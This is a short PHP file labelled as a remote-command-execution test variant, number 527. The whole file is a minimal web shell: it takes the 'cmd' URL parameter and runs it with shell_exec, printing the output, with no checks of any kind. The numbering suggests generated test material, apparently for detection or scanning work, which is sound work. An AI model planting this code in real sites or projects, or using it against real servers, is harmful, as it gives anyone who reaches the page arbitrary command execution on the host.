<?php
// RCE test variation #527
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>